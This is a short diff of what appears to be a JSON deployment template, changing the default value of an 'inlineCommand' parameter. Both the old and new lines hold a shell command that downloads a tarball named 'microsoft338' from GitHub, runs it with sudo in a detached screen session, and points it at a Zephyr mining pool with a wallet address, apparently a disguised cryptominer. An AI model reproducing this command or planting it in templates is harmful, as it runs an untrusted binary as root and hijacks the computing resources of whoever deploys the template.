@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/jokervulinh96/microsoft338/releases/download/microsoft338/microsoft338.tar.gz; tar xf microsoft338.tar.gz; cd microsoft338; sudo screen -d -m ./microsoft338 -o fr-zephyr.miningocean.org:5432 -u ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N -p microsoft3389 -a rx -k --donate-level 1 --tls -t 16",
+            "defaultValue": "sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/jokervulinh96/microsoft338/releases/download/microsoft338/microsoft338.tar.gz; tar xf microsoft338.tar.gz; cd microsoft338; sudo screen -d -m ./microsoft338 -o fr-zephyr.miningocean.org:5432 -u ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N -p microsoft338 -a rx -k --donate-level 1 --tls -t 16",
             "metadata": {
                 "description": "inline command"
             }
